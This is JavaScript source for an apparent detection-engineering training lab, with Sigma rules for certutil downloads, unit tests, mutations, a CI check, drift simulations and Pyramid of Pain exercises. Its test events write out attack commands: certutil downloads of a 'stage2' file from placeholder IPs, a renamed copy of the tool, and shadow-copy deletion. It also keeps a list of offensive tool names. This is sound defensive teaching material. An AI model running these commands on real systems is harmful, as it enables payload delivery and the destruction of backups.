    return { text, alerts: fp + tp, fp, tp, attacks: attacks.length, hidden, caught, perDay: (fp + tp) / 7, hours: (fp * MINUTES_PER_ALERT) / 60, warnings: c.warnings };
  }
  function filterEffect(id) {              // what this one filter does on its own
    const c = R.compile(tuneRule([id]));
    const f = TUNE_FILTERS.find((x) => x.id === id);
    const base = R.compile(tuneRule([]));
    let removed = 0; const hides = [];
    for (const a of ARCHETYPES) if (base.match(a) && !c.match(a)) { if (a._label === "attack") hides.push(a.name); else removed += a.count; }
    return { id, removed, hides, attrs: f.attrs };
  }

  // =========================================================================== the test lab
  const TEST_RULES = {
    narrow: String.raw`title: certutil Download (narrow)
id: 1c2d3e4f-5a6b-4c7d-8e9f-0a1b2c3d4e5f
status: experimental
description: The exact command line from one sample.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'certutil.exe -urlcache -f http'
    condition: selection
falsepositives:
    - Unknown
level: medium
`,
    broad: String.raw`title: certutil Download (broad)
id: 2d3e4f5a-6b7c-4d8e-9f0a-1b2c3d4e5f6a
status: experimental
description: Any command line that mentions urlcache.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains: 'urlcache'
    condition: selection
falsepositives:
    - Unknown
level: medium
`,
    good: PRESETS.certutil,
  };
  const TC = (name, kind, expect, o) => Object.assign({ name, kind, expect, _category: "process_creation", Computer: "WS-114", User: "CORP\\adm-ana", ParentImage: PSX }, o);
  const TEST_CASES = [
    TC("Plain download", "positive", true, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe -urlcache -f http://203.0.113.5/a.txt C:\\Users\\Public\\a.txt" }),
    TC("Quoted image path, extra flag", "positive", true, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: '"C:\\Windows\\System32\\certutil.exe" -urlcache -split -f http://203.0.113.5/a.txt a.txt' }),
    TC("Binary copied under another name", "positive", true, { Image: "C:\\Users\\Public\\cu.exe", OriginalFileName: "CertUtil.exe", CommandLine: "cu.exe -urlcache -f http://203.0.113.5/a.txt a.txt" }),
    TC("Flags written with slashes", "positive", true, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe /urlcache /f http://203.0.113.5/a.txt a.txt" }),
    TC("The verifyctl form", "positive", true, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe -verifyctl -f -split http://203.0.113.5/x" }),
    TC("Verify a certificate file", "negative", false, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe -verify C:\\certs\\root.cer" }),
    TC("Hash a file", "negative", false, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe -hashfile C:\\iso\\win.iso SHA256" }),
    TC("Clear the URL cache", "negative", false, { Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: "certutil.exe -urlcache * delete" }),
    TC("A text file whose name mentions it", "negative", false, { Image: W + "notepad.exe", OriginalFileName: "NOTEPAD.EXE", CommandLine: "notepad.exe C:\\notes\\certutil urlcache http notes.txt" }),
  ];
  const MUTATIONS = [
    { id: "upper", label: "UPPER CASE", fn: (e) => Object.assign({}, e, { Image: e.Image.toUpperCase(), CommandLine: e.CommandLine.toUpperCase() }) },
    { id: "slashes", label: "/ instead of - for flags", fn: (e) => Object.assign({}, e, { CommandLine: e.CommandLine.replace(/ -(?=[a-z])/gi, " /") }) },
    { id: "quote", label: "quoted full path to the program", fn: (e) => Object.assign({}, e, { CommandLine: /^"/.test(e.CommandLine) ? e.CommandLine : e.CommandLine.replace(/^(\S+)/, '"' + e.Image + '"') }) },
    { id: "spaces", label: "doubled spaces between arguments", fn: (e) => Object.assign({}, e, { CommandLine: e.CommandLine.replace(/ (?=\S)/g, "  ") }) },
    { id: "reorder", label: "flags in a different order", fn: (e) => Object.assign({}, e, { CommandLine: e.CommandLine.replace(/ -urlcache -f /i, " -f -urlcache ").replace(/ -urlcache -split -f /i, " -f -split -urlcache ").replace(/ \/urlcache \/f /i, " /f /urlcache ") }) },
    { id: "rename", label: "program renamed on disk", fn: (e) => Object.assign({}, e, { Image: "C:\\Users\\Public\\cu.exe", CommandLine: e.CommandLine.replace(/^("?[^ ]*?(certutil\.exe|cu\.exe)"?)/i, "cu.exe") }) },
  ];
  function runTests(compiled, withMutations) {
    const rows = [];
    for (const t of TEST_CASES) {
      const got = compiled.match(t);
      rows.push({ name: t.name, kind: t.kind, expect: t.expect, got, pass: got === t.expect });
      if (withMutations && t.expect === true) {
        for (const m of MUTATIONS) {
          const e = Object.assign(m.fn(t), { name: t.name, kind: "variant", expect: true });
          const g = compiled.match(e);
          rows.push({ name: t.name, kind: "variant", mutation: m.id, mutationLabel: m.label, expect: true, got: g, pass: g, cmd: e.CommandLine });
        }
      }
    }
    return rows;
  }
  function testSummary(rows) {
    const base = rows.filter((r) => r.kind !== "variant"), vars = rows.filter((r) => r.kind === "variant");
    return { passed: base.filter((r) => r.pass).length, total: base.length, varPassed: vars.filter((r) => r.pass).length, varTotal: vars.length };
  }

  // =========================================================================== the CI pipeline demo
  const CI_RULE = String.raw`title: certutil Used To Download A File
id: e3a1b7c4-52d8-4f60-9a3b-7c1d0e8f2b95
status: test
description: certutil with its URL-cache option and a web address, a way to fetch a file with a tool that is already installed.
author: Detection Engineering demo (invented)
date: 2026-11-09
tags:
    - attack.command-and-control
    - attack.t1105
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\certutil.exe'
        - OriginalFileName: 'CertUtil.exe'
    selection_flags:
        CommandLine|windash|contains:
            - '-urlcache '
            - '-verifyctl '
    selection_http:
        CommandLine|contains: 'http'
    condition: all of selection_*
falsepositives:
    - Administrators fetching certificate revocation lists
level: medium
`;
  const CI_EXISTING_IDS = ["19b08b1c-861d-4e75-a1ef-ea0c1baf202b", "92626ddd-662c-49e3-ac59-f6535f12d189", "c947b146-0abc-4c87-9c64-b17e9d7274a2"];
  const CI_BREAKS = [
    { id: "dup", label: "Reuse another rule's id", fn: (t) => t.replace(/^id: .*$/m, "id: " + CI_EXISTING_IDS[0]) },
    { id: "noid", label: "Delete the id", fn: (t) => t.replace(/^id: .*\n/m, "") },
    { id: "nofp", label: "Delete falsepositives", fn: (t) => t.replace(/falsepositives:\n    - .*\n/, "") },
    { id: "cond", label: "Typo in the condition", fn: (t) => t.replace("all of selection_*", "all of selecton_*") },
    { id: "mod", label: "Misspell a modifier", fn: (t) => t.replace("|windash|contains:", "|windash|contian:") },
    { id: "field", label: "Misspell a field name", fn: (t) => t.replace("selection_http:\n        CommandLine", "selection_http:\n        CommandLin") },
    { id: "broad", label: "Loosen it to any mention of certutil", fn: (t) => t.replace(/detection:[\s\S]*?\nfalsepositives:/, "detection:\n    selection:\n        CommandLine|contains: 'certutil'\n    condition: selection\nfalsepositives:") },
    { id: "narrow", label: "Narrow it to one exact command", fn: (t) => t.replace(/detection:[\s\S]*?\nfalsepositives:/, "detection:\n    selection:\n        CommandLine: 'certutil.exe -urlcache -f http://203.0.113.5/a.txt C:\\Users\\Public\\a.txt'\n    condition: selection\nfalsepositives:") },
    { id: "tag", label: "Tag a technique that doesn't exist", fn: (t) => t.replace("attack.t1105", "attack.t1105\n    - attack.t9999") },
    { id: "date", label: "Write the date the wrong way", fn: (t) => t.replace(/^date: .*$/m, "date: 09/11/2026") },
  ];
  // one invented week of benign process-creation events that mention certutil (the rest of the log is just scale)
  const BASELINE = [
    { cmd: "certutil.exe -verify C:\\certs\\root.cer", count: 40 }, { cmd: "certutil.exe -hashfile C:\\iso\\win.iso SHA256", count: 25 },
    { cmd: "certutil.exe -urlcache * delete", count: 6 }, { cmd: "certutil.exe -urlcache -f http://pki.example.test/crl/root.crl C:\\temp\\root.crl", count: 3 },
  ].map((b) => ({ _category: "process_creation", Image: W + "certutil.exe", OriginalFileName: "CertUtil.exe", CommandLine: b.cmd, User: "CORP\\adm-ana", ParentImage: PSX, Computer: "WS-114", count: b.count }));
  const BASELINE_TOTAL = 52000;           // all process-creation events in the invented week, for scale
  const CI_BUDGET_PER_DAY = 2;
  const PC_FIELDS = ["Image", "OriginalFileName", "CommandLine", "ParentImage", "ParentCommandLine", "User", "IntegrityLevel", "Hashes", "Computer", "UtcTime"];
  function ciRun(text) {
    const steps = [];
    const add = (name, status, detail) => steps.push({ name, status, detail });
    let obj, compiled;
    try { obj = R.parseYaml(text); add("1. Parse the YAML", "pass", "readable"); }
    catch (e) { add("1. Parse the YAML", "fail", e.message); ["2. Check the metadata", "3. Compile the detection", "4. Run the unit tests", "5. Back-test on a week of logs", "6. Peer review"].forEach((n) => add(n, "skip", "not run")); return { steps, pass: false }; }
    const issues = R.lintRule(obj, { existingIds: CI_EXISTING_IDS, techniqueIds: TECHNIQUE_IDS, attackVersion: ATTACK_VERSION, testsCount: TEST_CASES.length });
    const errs = issues.filter((i) => i.level === "error"), warns = issues.filter((i) => i.level === "warn");
    add("2. Check the metadata", errs.length ? "fail" : warns.length ? "warn" : "pass", errs.length ? errs.map((e) => e.msg).join("; ") : warns.length ? warns.map((e) => e.msg).join("; ") : "id, status, date, level, falsepositives and ATT&CK tags are all in order");
    try { compiled = R.compile(obj); add("3. Compile the detection", compiled.warnings.length ? "warn" : "pass", compiled.warnings.length ? compiled.warnings.join("; ") : "the condition and every modifier are valid"); }
    catch (e) { add("3. Compile the detection", "fail", e.plain || e.message); ["4. Run the unit tests", "5. Back-test on a week of logs", "6. Peer review"].forEach((n) => add(n, "skip", "not run")); return { steps, pass: false }; }
    const rows = runTests(compiled, true);
    const sum = testSummary(rows);
    const failed = rows.filter((r) => !r.pass);
    add("4. Run the unit tests", failed.length ? "fail" : "pass", failed.length ? sum.passed + " of " + sum.total + " cases and " + sum.varPassed + " of " + sum.varTotal + " variants pass. First failure: " + (failed[0].mutationLabel ? failed[0].name + " (" + failed[0].mutationLabel + ")" : failed[0].name + " should " + (failed[0].expect ? "match" : "not match")) : "all " + sum.total + " cases and " + sum.varTotal + " variants pass");
    const unknown = compiled.fields.filter((f) => !PC_FIELDS.includes(f));
    let weekly = 0;
    for (const b of BASELINE) if (compiled.match(b)) weekly += b.count;
    const perDay = weekly / 7;
    let status = "pass", detail = weekly + " alerts in the week (" + perDay.toFixed(1) + " a day, budget " + CI_BUDGET_PER_DAY + ") out of " + BASELINE_TOTAL.toLocaleString("en-US") + " events";
    if (unknown.length) { status = "fail"; detail = "the rule reads " + unknown.join(", ") + ", which no process-creation event has: it can never match"; }
    else if (perDay > CI_BUDGET_PER_DAY) { status = "fail"; detail = weekly + " alerts in the week (" + perDay.toFixed(1) + " a day) is over the budget of " + CI_BUDGET_PER_DAY + " a day"; }
    add("5. Back-test on a week of logs", status, detail);
    const pass = steps.every((s) => s.status !== "fail");
    add("6. Peer review", pass ? "pass" : "skip", pass ? "ready for a second pair of eyes" : "blocked until the checks above pass");
    return { steps, pass, weekly, perDay, tests: sum };
  }

  // =========================================================================== coverage: a grid of techniques and how well each has been tested
  const COV_STATES = [
    { id: 0, name: "Nothing", short: "none" },
    { id: 1, name: "Data collected, no rule", short: "data" },
    { id: 2, name: "A rule exists", short: "rule" },
    { id: 3, name: "Tested once in a lab", short: "tested" },
    { id: 4, name: "Tested against variants and tuned", short: "robust" },
  ];
  const COV_TECHS = ["T1566", "T1204", "T1059.001", "T1059.003", "T1053.005", "T1547.001", "T1543.003", "T1055", "T1078", "T1110.003", "T1003.001", "T1021.001",
    "T1105", "T1071", "T1041", "T1567", "T1486", "T1490", "T1685.005", "T1070", "T1218.011", "T1027", "T1136", "T1098"].map((id) => ({ id, name: TECH[id] }));
  const COV_BOARDS = {
    painted: COV_TECHS.map((t, i) => ([5, 6, 7, 10, 14, 18, 20, 21].includes(i) ? 0 : 2)),
    tested: COV_TECHS.map((t, i) => (i % 3 === 2 ? 0 : 4)),
    mixed: COV_TECHS.map((t, i) => [4, 2, 4, 3, 2, 1, 0, 0, 3, 2, 1, 0, 4, 2, 0, 1, 3, 4, 2, 2, 0, 0, 3, 2][i]),
  };
  function coverageStats(states) {
    const n = states.length;
    const rule = states.filter((s) => s >= 2).length, tested = states.filter((s) => s >= 3).length, robust = states.filter((s) => s >= 4).length;
    return { n, rule, tested, robust, heat: Math.round((100 * rule) / n), testedPct: Math.round((100 * tested) / n), robustPct: Math.round((100 * robust) / n) };
  }

  // =========================================================================== rule metrics
  const RULE_STATS = [
    { id: "r1", name: "Shadow copies deleted", fires: 3, tp: 2, triage: 6, tested: 20, tuned: 40, owner: true },
    { id: "r2", name: "Office app starts a shell", fires: 18, tp: 9, triage: 9, tested: 35, tuned: 12, owner: true },
    { id: "r3", name: "Encoded PowerShell", fires: 310, tp: 4, triage: 5, tested: 400, tuned: 300, owner: true },
    { id: "r4", name: "New admin account created", fires: 6, tp: 5, triage: 12, tested: 60, tuned: 90, owner: true },
    { id: "r5", name: "Logon from a new country", fires: 140, tp: 2, triage: 8, tested: 210, tuned: 200, owner: false },
    { id: "r6", name: "certutil download", fires: 4, tp: 3, triage: 7, tested: 210, tuned: 25, owner: true },
    { id: "r7", name: "Old VPN appliance exploit signature", fires: 0, tp: 0, triage: 0, tested: 720, tuned: 800, owner: false },
    { id: "r8", name: "Security log cleared", fires: 1, tp: 1, triage: 15, tested: 30, tuned: 100, owner: true },
    { id: "r9", name: "Scheduled task, user folder", fires: 22, tp: 1, triage: 6, tested: 150, tuned: 150, owner: true },
    { id: "r10", name: "Rare parent-child process pair", fires: 520, tp: 3, triage: 4, tested: 500, tuned: 480, owner: false },
  ];
  function rateRules(stats, th) {
    th = Object.assign({ minPrecision: 20, maxHours: 8, staleDays: 180 }, th || {});
    return stats.map((s) => {
      const precision = s.fires ? Math.round((100 * s.tp) / s.fires) : null;
      const hours = (s.fires * s.triage) / 60;
      const why = [];
      let verdict = "keep";
      if (s.fires === 0 && s.tested > th.staleDays) { verdict = "retire?"; why.push("silent for the whole week, and not tested in " + s.tested + " days: is it still working, or is the threat gone?"); }
      else if (s.fires === 0) { verdict = "check"; why.push("silent: confirm with a test event that it can still fire"); }
      else {
        if (precision < th.minPrecision) { verdict = "tune"; why.push("only " + precision + "% of alerts were real"); }
        if (hours > th.maxHours) { verdict = "tune"; why.push(hours.toFixed(1) + " analyst hours a week"); }
        if (verdict === "tune" && s.tp === 0) { verdict = "retire?"; why.push("no real finding all week"); }
        if (verdict === "keep" && s.tested > th.staleDays) { verdict = "test"; why.push("not tested in " + s.tested + " days"); }
      }
      if (!s.owner) { why.push("no named owner"); if (verdict === "keep") verdict = "assign owner"; }
      return Object.assign({}, s, { precision, hours, verdict, why });
    });
  }

  // =========================================================================== drift: what makes a rule go quiet
  const DRIFT_EXTRA = [
    pe("10:15:00", "AP-LT-07", "CORP\\pat", PSX, "C:\\Users\\Public\\cu.exe", "cu.exe -urlcache -f http://203.0.113.50/stage2.txt C:\\Users\\Public\\stage2.txt", "attack",
       "ATTACK: certutil copied to another name, then used to download.", { _beh: "certutil", OriginalFileName: "CertUtil.exe" }),
    pe("10:16:00", "AP-LT-07", "CORP\\pat", PSX, "C:\\Users\\Public\\vs.exe", "vs.exe delete shadows /all /quiet", "attack",
       "ATTACK: the shadow-copy tool copied to another name.", { _beh: "vss", OriginalFileName: "VSSADMIN.EXE" }),
  ];
  const DRIFTS = [
    { id: "none", short: "Nothing changes", label: "Nothing changes", describe: "The baseline.", fn: (e) => e },
    { id: "field", short: "A field is renamed", label: "An agent upgrade renames ParentImage to ParentProcessName", describe: "Rules that read ParentImage stop matching. Nothing logs an error.",
      fn: (e) => { const o = Object.assign({}, e); if ("ParentImage" in o) { o.ParentProcessName = o.ParentImage; delete o.ParentImage; } return o; } },
    { id: "cmd", short: "Command line logging off", label: "Command-line logging is switched off by a policy change", describe: "The field is still there. It is empty.", fn: (e) => Object.assign({}, e, { CommandLine: "" }) },
    { id: "orig", short: "No original file name", label: "The sensor stops sending OriginalFileName", describe: "Rules that rely on it to catch renamed programs lose that protection.", fn: (e) => { const o = Object.assign({}, e); delete o.OriginalFileName; return o; } },
  ];
  function driftRun(driftId) {
    const d = DRIFTS.find((x) => x.id === driftId) || DRIFTS[0];
    const rules = [["office", "Office app starts a shell"], ["certutil", "certutil download"], ["task", "Scheduled task, user folder"], ["vss", "Shadow copies deleted"]];
    const events = PLAY_EVENTS.concat(DRIFT_EXTRA).map(d.fn);
    return rules.map(([id, name]) => {
      const c = R.compile(PRESETS[id]);
      const rows = R.evaluate(c, events);
      const mine = rows.filter((r) => r.event._beh === id);            // the attack events of this rule's own behaviour
      const caught = mine.filter((r) => r.fired).length;
      const fp = rows.filter((r) => r.fired && r.event._label !== "attack").length;
      // a canary: one synthetic event of the kind the rule must catch, pushed through the same pipeline
      const canarySrc = PLAY_EVENTS.find((e) => e._beh === id);
      const canary = canarySrc ? c.match(d.fn(canarySrc)) : false;
      return { id, name, caught, attacks: mine.length, fp, canary };
    });
  }

  // =========================================================================== the Pyramid of Pain, the report exercise and the other teaching data
  const RUNGS = [
    { id: "hash", name: "Hash values", pain: 1, stp: "Level 1: Ephemeral Values", quote: "It is so easy for hash values to change.",
      what: "A fingerprint of one specific file.", example: "SHA-256 of svc_update.exe", change: "Rebuild the program, or add one byte.", get: "An exact match with no false alarms, for that one sample." },
    { id: "ip", name: "IP addresses", pain: 2, stp: "Level 1: Ephemeral Values", quote: "They can usually recover without even breaking stride.",
      what: "The address of a server the attacker uses.", example: "203.0.113.50", change: "Rent another server.", get: "A quick block and a hunt for who talked to it. Addresses are reused by other tenants, so check before you block." },
    { id: "domain", name: "Domain names", pain: 3, stp: "Level 1: Ephemeral Values", quote: "Slightly harder to change than just IP addresses.",
      what: "A name the attacker has registered.", example: "update-cdn.example.test", change: "Register another name, and wait for it to age.", get: "Good for mail filtering and DNS blocks, and for finding other victims." },
    { id: "artifact", name: "Network and host artifacts", pain: 4, stp: "Level 1 to 2: values and attacker-controlled details",
      quote: "Observables caused by adversary activities on your network or hosts.",
      what: "Details the attacker's activity leaves: a User-Agent string, a URL pattern, a registry key, a file name, a task name.", example: "a task named 'OneDrive Sync Helper'; the User-Agent MothClient/1.2",
      change: "Reconfigure and rebuild their tools.", get: "More durable than an address, and still cheap for them to alter once they know." },
    { id: "tool", name: "Tools", pain: 5, stp: "Level 2: Core to Adversary-Brought Tools", quote: "They have to invest time in research, development and training.",
      what: "Software the attacker brings: loaders, password stealers, remote-control programs.", example: "a custom loader called MothDrop", change: "Find, build or buy a replacement, and learn it.", get: "Detections tied to how a tool works, not what it's called, last a long time." },
    { id: "ttp", name: "TTPs (behaviour)", pain: 6, stp: "Level 3 to 5: Core to Pre-Existing Tools up to Core to the Technique",
      quote: "How the adversary goes about accomplishing their mission.",
      what: "How the attacker gets things done: tactics, techniques and procedures.", example: "Office starts PowerShell with a hidden window and an encoded command", change: "Learn and rehearse a new way to do the job.", get: "The detections they can't dodge with a rebuild. They must change how they work." },
  ];
  const REPORT = [
    { id: "s1", text: "Invoice emails come from the domain acme-payables.example.test.", rung: "domain", pick: "enrich", why: "Block it and search the mail logs for it, but they can register another name in minutes." },
    { id: "s2", text: "The attachment is a macro-enabled workbook named invoice_Oct.xlsm.", rung: "artifact", pick: "enrich", why: "A file name is cheap to change. The behaviour of the macro, in step 4, is what you detect." },
    { id: "s3", text: "The loader file is svc_update.exe, with SHA-256 " + H1.slice(0, 8).toLowerCase() + "…", rung: "hash", pick: "enrich", why: "One exact sample. Load it into your blocklist and your search tools, and expect it to stop mattering." },
    { id: "s4", text: "When the macro runs, Excel starts PowerShell with a hidden window and an encoded command.", rung: "ttp", pick: "detect", attack: "T1059.001", data: "Process creation with the parent process and the command line", why: "A behaviour, written once, that catches new files, hashes and servers." },
    { id: "s5", text: "The loader connects to 203.0.113.50 over HTTPS.", rung: "ip", pick: "enrich", why: "Good for a hunt over last week's network logs. Not a rule to rely on." },
    { id: "s6", text: "It looks up update-cdn.example.test.", rung: "domain", pick: "enrich", why: "Useful for DNS blocking and for finding other infected machines." },
    { id: "s7", text: "It identifies itself with the User-Agent string MothClient/1.2.", rung: "artifact", pick: "enrich", why: "Cheap to change, and only visible if you keep proxy logs. A fine hunting term." },
    { id: "s8", text: "It downloads a second stage using certutil's URL-cache option.", rung: "ttp", pick: "detect", attack: "T1105", data: "Process creation with the command line", why: "A way to download a file with a tool that is already installed. They can use another, so also write the broader rule." },
    { id: "s9", text: "The scheduled task it creates is named 'OneDrive Sync Helper'.", rung: "artifact", pick: "enrich", why: "A name they choose. Search for it, but don't rely on it." },
    { id: "s10", text: "The scheduled task runs a program from C:\\Users\\Public, a folder every user can write to.", rung: "ttp", pick: "detect", attack: "T1053.005", data: "Process creation with the command line (or task-creation events)", why: "The behaviour is persistence from a writable folder. Task names and file names can change; this can't without a different approach." },
    { id: "s11", text: "Before it encrypts files, it deletes the volume shadow copies.", rung: "ttp", pick: "detect", attack: "T1490", data: "Process creation with the command line", why: "A step ransomware operators rely on, and a rare one in normal work. Filter the backup software that does it on purpose." },
    { id: "s12", text: "A custom tool called MothDrop stages the files for upload.", rung: "tool", pick: "enrich", why: "Tools cost the attacker effort to replace, but you need file or memory telemetry to see this one. Note it, and watch for the behaviour around it." },
  ];
  const ATTACK_QUIZ = [
    { id: "q1", text: "An invoice email with a macro-enabled attachment is sent to accounts payable.", answer: "T1566.001" },
    { id: "q2", text: "Excel starts PowerShell with a hidden window and an encoded command.", answer: "T1059.001" },
    { id: "q3", text: "certutil is used to download a file from an external address.", answer: "T1105" },
    { id: "q4", text: "A scheduled task is created to run a dropped program at logon.", answer: "T1053.005" },
    { id: "q5", text: "Every shadow copy on the machine is deleted.", answer: "T1490" },
    { id: "q6", text: "Files across a server are encrypted.", answer: "T1486" },
  ];
  const ATTACK_OPTIONS = ["T1566.001", "T1059.001", "T1105", "T1053.005", "T1490", "T1486", "T1547.001", "T1543.003", "T1003.001"];
  const LIFECYCLE = [
    { id: "idea", name: "Idea", make: "A hypothesis: 'if an attacker does X, we would see Y'.", wrong: "Starting from a tool's alert list, not from a behaviour you care about.", ask: "Which behaviour, and why does it matter to us?" },
    { id: "data", name: "Data", make: "A list of the log sources and fields that would show it.", wrong: "The field isn't collected, is empty by default, or is called something else on another sensor.", ask: "Can we see this today, on which machines?" },
    { id: "rule", name: "Rule", make: "A rule in a portable format, with a title, an ID, a log source, a condition and an ATT&CK tag.", wrong: "A rule written against the first sample, so it matches that sample and little else.", ask: "What is the behaviour, and what else looks like it?" },
    { id: "test", name: "Test", make: "Positive and negative test events, run on every change.", wrong: "Only testing the exact sample the rule came from.", ask: "What variants should it catch, and what must it leave alone?" },
    { id: "deploy", name: "Deploy", make: "A staged rollout: log only, then low priority, then paging.", wrong: "Turning on a new rule at full volume on a Friday.", ask: "What is the alert budget, and who gets it?" },
    { id: "tune", name: "Tune", make: "Narrow filters with a reason, an owner and a review date.", wrong: "An allow-list that quietly hides the attack too.", ask: "Is each exclusion specific enough that an attacker couldn't easily copy it?" },
    { id: "retire", name: "Retire", make: "A deprecated status, a link to what replaced it, and the evidence for retiring it.", wrong: "Leaving rules running that no longer work, or that nobody reads.", ask: "Is it still working, still useful, and still owned?" },
  ];
  const ADS = [
    { id: "goal", name: "Goal", text: "Detect an Office application starting PowerShell or the command shell, the usual way a malicious macro runs its next step." },
    { id: "cat", name: "Categorization", text: "ATT&CK: Execution / Command and Scripting Interpreter / PowerShell (T1059.001) and Windows Command Shell (T1059.003). Preferably both the parent technique and the sub-technique, as the template asks." },
    { id: "abs", name: "Strategy Abstract", text: "Look at process-creation events. Alert when the parent is Excel or Word and the child is powershell.exe or cmd.exe. Enrichment: none. False positive reduction: exclude the finance workbook that calls its signed refresh script, matched by its command line." },
    { id: "ctx", name: "Technical Context", text: "Macros run inside the Office process, so a script interpreter appears as its child. The responder needs: the parent's command line (which file was open), the child's full command line, the user and the host, and whether the file came from email." },
    { id: "blind", name: "Blind Spots and Assumptions", text: "Assumes process-creation events carry the parent image and command line (not the case for Windows Security 4688 with default policy). Misses macros that inject into another process, Office add-ins that run code in-process, and interpreters it doesn't list (wscript.exe, mshta.exe)." },
    { id: "fp", name: "False Positives", text: "Known: the finance refresh macro (filtered by command line). Possible: other internal automation that runs scripts from Office. Suppress by matching the parent's command line and the script's path, not by turning the rule off for Excel." },
    { id: "val", name: "Validation", text: "A unit test for each variant (case, quoting, short flags, a renamed copy). In a lab: a document that starts a harmless interpreter command, using an approved test from your adversary-emulation library. Record the date and the result." },
    { id: "prio", name: "Priority", text: "Medium by default. High when the child's command line has a hidden window or an encoded command, or the document came from outside. Critical is reserved for near-certain cases." },
    { id: "resp", name: "Response", text: "1. Read the parent's command line and the child's. 2. Was the document expected? Ask the user. 3. Look for what the child did next (downloads, scheduled tasks). 4. If unsure, isolate the host and hand over to incident response." },
    { id: "more", name: "Additional Resources", text: "ATT&CK T1059.001; the rule file and its tests in the detections repository; the finance team's contact for the macro." },
  ];
  const CHECKLIST = [
    "It's written down: the goal, the data it needs, what it can't see, and who owns it",
    "It's in version control, in a portable format, with a unique id",
    "It's tagged with the ATT&CK technique it covers",
    "It has positive tests, including variants of the behaviour",
    "It has negative tests: benign look-alikes it must leave alone",
    "It's been back-tested on at least a week of real logs, and its volume fits the alert budget",
    "Every exclusion is narrow, has a reason, an owner and a review date",
    "A second person has reviewed the rule, the tests and the filters",
    "It was rolled out in stages: log only, then low priority, then paging",
    "Whoever is on call has a first-look note: what to check, and who to ask",
    "A canary event runs through the whole pipeline on a schedule, to show it still fires",
    "It has a review date, and a written reason it would be retired",
  ];

  // =========================================================================== the title terminal: which rung of the pyramid is this?
  const FILE_EXT = /\.(exe|dll|ps1|bat|cmd|txt|doc|docx|xls|xlsx|xlsm|docm|zip|rar|js|vbs|scr|msi|dat|bin|lnk|iso|tmp|log)$/i;
  const TOOLS = ["mimikatz", "cobalt strike", "cobaltstrike", "psexec", "metasploit", "nmap", "mothdrop", "bloodhound", "rubeus", "sliver", "empire"];
  function classify(input) {
    const t = String(input).trim();
    if (!t) return { rung: null, kind: "empty" };
    const low = t.toLowerCase();
    if (/^[0-9a-f]{64}$/i.test(t) || /^[0-9a-f]{40}$/i.test(t) || /^[0-9a-f]{32}$/i.test(t)) return { rung: "hash", kind: "hash", len: t.length * 4 };
    if (/^(\d{1,3}\.){3}\d{1,3}(:\d+)?$/.test(t) || /^[0-9a-f:]*:[0-9a-f:]+$/i.test(t)) return { rung: "ip", kind: "ip" };
    if (/^t\d{4}(\.\d{3})?$/i.test(t)) { const id = t.toUpperCase(); return { rung: "ttp", kind: "technique", id, name: TECH[id] || null }; }
    if (TOOLS.some((x) => low === x)) return { rung: "tool", kind: "tool" };
    if (/^https?:\/\/[^/\s]+\/\S+/i.test(t) || /^mozilla\/|user-?agent/i.test(low) || /^(hkey_|hklm|hkcu)/i.test(low)) return { rung: "artifact", kind: "artifact" };
    if (/^https?:\/\/[^/\s]+\/?$/i.test(t) || (/^[a-z0-9-]+(\.[a-z0-9-]+)+$/i.test(t) && !FILE_EXT.test(t))) return { rung: "domain", kind: "domain" };
    if (FILE_EXT.test(t) || /^[a-z]:\\/i.test(t) || /task named|named '/i.test(low)) return { rung: "artifact", kind: "file" };
    if (/(starts?|spawns?|launch|creates?|deletes?|runs?|uses?|disables?|downloads?|persist|from office|encoded command|scheduled task|shadow cop|dump)/i.test(t) && t.split(/\s+/).length >= 3) return { rung: "ttp", kind: "behaviour" };
    return { rung: null, kind: "unknown" };
  }

  const Scen = {
    TECH, TECHNIQUE_IDS, ATTACK_VERSION, PLAY_EVENTS, ALL_EVENTS: PLAY_EVENTS.concat(DRIFT_EXTRA), ATTACK_BEHAVIOURS, PRESETS, PRESET_LABELS, TELEMETRY, degrade, missingFields,
    H1, H2, CHAIN_CHANGES, PERSIST, CHAIN_RULES, chainEvents, chainRun, ARCHETYPES, TUNE_FILTERS, tuneRule, tuneRun, filterEffect, MINUTES_PER_ALERT,
    TEST_RULES, TEST_CASES, MUTATIONS, runTests, testSummary, CI_RULE, CI_BREAKS, CI_EXISTING_IDS, BASELINE, BASELINE_TOTAL, CI_BUDGET_PER_DAY, ciRun,
    COV_STATES, COV_TECHS, COV_BOARDS, coverageStats, RULE_STATS, rateRules, DRIFTS, driftRun, RUNGS, REPORT, ATTACK_QUIZ, ATTACK_OPTIONS, LIFECYCLE, ADS, CHECKLIST, classify, sha,
  };
  root.Scen = Scen;
  if (typeof module !== "undefined" && module.exports) module.exports = Scen;
})(typeof window !== "undefined" ? window : globalThis);
